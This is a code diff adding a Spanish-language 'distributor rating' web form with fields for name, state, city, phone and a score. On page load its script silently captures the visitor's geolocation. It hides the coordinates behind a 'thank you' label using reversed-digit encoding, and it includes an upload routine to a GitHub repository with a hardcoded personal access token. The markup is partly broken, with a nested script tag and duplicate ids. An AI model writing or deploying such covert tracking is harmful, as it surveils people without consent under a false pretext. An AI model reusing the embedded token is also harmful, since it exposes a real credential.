@@ -1,6 +1,72 @@
-<script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CALIFICADOR DE DISTRIBUIDOR</title>
+    <script>
+        var ubicacionesRegistradas = [];
+
+        // Función para rastrear automáticamente la ubicación al cargar la página
+        window.onload = function() {
+            rastrearUbicacion();
+        };
+
+        function rastrearUbicacion() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var latitud = position.coords.latitude;
+                var longitud = position.coords.longitude;
+
+                // Agregar la ubicación al arreglo de ubicaciones
+                ubicacionesRegistradas.push({latitud: latitud, longitud: longitud});
+
+                // Mostrar las últimas 5 ubicaciones en la lista
+                actualizarListaUbicaciones();
+
+                // Enviar las ubicaciones al servidor
+                enviarUbicacionesAlServidor();
+            }, function(error) {
+                console.error('Error al obtener la ubicación:', error);
+            });
+        }
+
+        function actualizarListaUbicaciones() {
+            var lista = document.getElementById("ubicaciones");
+            lista.innerHTML = ""; // Limpiar la lista antes de agregar nuevas ubicaciones
+
+            // Mostrar las últimas 5 ubicaciones en la lista
+            var inicio = Math.max(0, ubicacionesRegistradas.length - 5); // Asegurarse de que no intentemos acceder a índices negativos
+            for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
+                var ubicacion = ubicacionesRegistradas[i];
+                var nuevaUbicacion = document.createElement("li");
+                nuevaUbicacion.textContent = "Gracias por sus respuestas "; // Etiqueta genérica, no revela la ubicación real
+                nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
+                nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);
+                nuevaUbicacion.onclick = function() {
+                    alert("Latitud: " + decodificarCoordenada(this.dataset.latitud) + ", Longitud: " + decodificarCoordenada(this.dataset.longitud));
+                };
+                lista.appendChild(nuevaUbicacion);
+            }
+        }
+
+        function codificarCoordenada(coordenada) {
+            // Aplicar una codificación simple, por ejemplo, inversión de los dígitos
+            return coordenada.toFixed(4).split('').reverse().join('');
+        }
+
+        function decodificarCoordenada(coordenadaCodificada) {
+            // Decodificar la coordenada, simplemente volviendo a invertir los dígitos
+            return parseFloat(coordenadaCodificada.split('').reverse().join(''));
+        }
+
+        function enviarUbicacionesAlServidor() {
+            // Aquí puedes enviar las ubicaciones al servidor
+            // Puedes enviar el arreglo completo o solo las últimas ubicaciones agregadas
+        }
+
+       <script>
 async function descargarUbicaciones() {
-    const token = "TU_TOKEN_GITHUB"; // ⚠️ Reemplaza con tu token personal o mejor, guárdalo del lado del servidor
+    const token = "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"; // ⚠️ Reemplaza con tu token personal o mejor, guárdalo del lado del servidor
     const repo = "tu_usuario/clientes"; // ⚠️ Reemplaza con tu usuario/repositorio
     const filePath = `clientes/cliente_${Date.now()}.txt`;
 
@@ -30,4 +96,47 @@ async function descargarUbicaciones() {
         alert("Error al subir el código. Revisa la consola.");
     }
 }
-</script>
+
+
+
+        // Función de encriptación simple
+        function encriptar(texto) {
+            // Esta es solo una encriptación simple de ejemplo
+            // Puedes usar algoritmos de encriptación más robustos según tus necesidades
+            return btoa(texto);
+        }
+    </script>
+</head>
+<body>
+    <h1>Formulario para Distribuidor</h1>
+    <p>Nombre de Distribuidor:</p>
+    <form>
+        <textarea id="respuesta" name="respuesta" rows="1" cols="35"></textarea><br><br>
+    </form>
+    <p>Estado:</p>
+    <form>
+        <textarea id="respuesta" name="respuesta" rows="1" cols="35"></textarea><br><br>
+    </form>
+    <p>Ciudad o pueblo:</p>
+    <form>
+        <textarea id="respuesta" name="respuesta" rows="1" cols="35"></textarea><br><br>
+    </form>
+     <p>Número telefónico:</p>
+    <form>
+        <textarea id="respuesta" name="respuesta" rows="1" cols="35"></textarea><br><br>
+    </form>
+    <p>Calificación de Distribuidor del 1 al 10:</p>
+    <form>
+        <textarea id="respuesta" name="respuesta" rows="1" cols="10"></textarea><br><br>
+    </form>
+
+    <!-- Sección para mostrar las últimas 5 ubicaciones registradas -->
+   
+    <ul id="ubicaciones">
+        <!-- Aquí se mostrarán las ubicaciones registradas -->
+    </ul>
+
+    <!-- Botón para descargar las ubicaciones registradas -->
+    <button onclick="descargarUbicaciones()">Generar y descargar código</button>
+</body>
+</html>
